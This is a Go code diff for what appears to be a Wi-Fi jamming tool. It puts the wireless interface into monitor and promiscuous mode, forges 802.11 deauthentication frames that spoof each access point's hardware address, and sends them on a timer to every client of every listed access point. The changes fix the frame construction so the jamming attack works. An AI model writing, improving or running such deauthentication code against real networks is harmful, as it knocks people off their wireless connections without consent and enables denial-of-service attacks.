@@ -179,6 +179,9 @@ func (conn *JamConn) SetupPcapHandle() error {
 	if err := inactive.SetRFMon(true); err != nil {
 		log.Fatalln(err)
 	}
+	if err := inactive.SetPromisc(true); err != nil {
+		log.Fatalln(err)
+	}
 	conn.handle, err = inactive.Activate()
 	if err != nil {
 		return errors.New("pcap.InactiveHandle.Activate()" + err.Error())
@@ -301,9 +304,9 @@ func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) er
 
 	if time.Since(conn.lastDeauth) > timeout {
 		for _, v := range apList.contents {
-			sta := v.(Ap)
-			for _, cli := range sta.Clients {
-				if err := conn.Deauth(&cli, sta.hwaddr); err != nil {
+			ap := v.(Ap)
+			for _, cli := range ap.Clients {
+				if err := conn.Deauth(&cli, &ap); err != nil {
 					return errors.New("JamConn.Deauth() " + err.Error())
 				}
 			}
@@ -313,39 +316,44 @@ func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) er
 	return nil
 }
 
-func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
+func (conn *JamConn) Deauth(client *Client, ap *Ap) error {
 
 	var buff gopacket.SerializeBuffer
 	var opts gopacket.SerializeOptions
 
+	buff = gopacket.NewSerializeBuffer()
 	opts.ComputeChecksums = true
-	mgmt := layers.Dot11MgmtDeauthentication {
-		Reason: layers.Dot11ReasonDeauthStLeaving,
-	}
+	opts.FixLengths = true
 	dot11 := layers.Dot11{
 		Type: layers.Dot11TypeMgmtDeauthentication,
 		Proto: 0,
 		Flags: layers.Dot11Flags(0),
 		DurationID: client.dot11Hdr.DurationID,
+		//dst
 		Address1: client.hwaddr,
-		Address2: ap,
-		Address3: ap,
+		//src
+		Address2: ap.hwaddr,
+		//bssid
+		Address3: ap.hwaddr,
+		//
+		Address4: ap.hwaddr,
 		SequenceNumber: client.dot11Hdr.SequenceNumber + 1,
 		FragmentNumber: 0,
 	}
-	buff = gopacket.NewSerializeBuffer()
-	err := gopacket.SerializeLayers(buff, opts,
-		&client.radioTapHdr,
+	mgmt := layers.Dot11MgmtDeauthentication {
+		Reason: layers.Dot11ReasonDeauthStLeaving,
+	}
+	if err := gopacket.SerializeLayers(buff, opts,
+		&ap.radioTapHdr,
 		&dot11,
 		&mgmt,
-	)
-	if err != nil {
+	); err != nil {
 		return errors.New("gopacket.SerializeLayers() " + err.Error())
 	}
 	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 		return errors.New("Handle.WritePacketData() " + err.Error())
 	}
-	fmt.Printf("sent deauth from %s\n", client.hwaddr)
+	fmt.Printf("deauthing for ap %s - %s\n", ap.SSID, ap.hwaddr.String())
 	return nil
 }
 
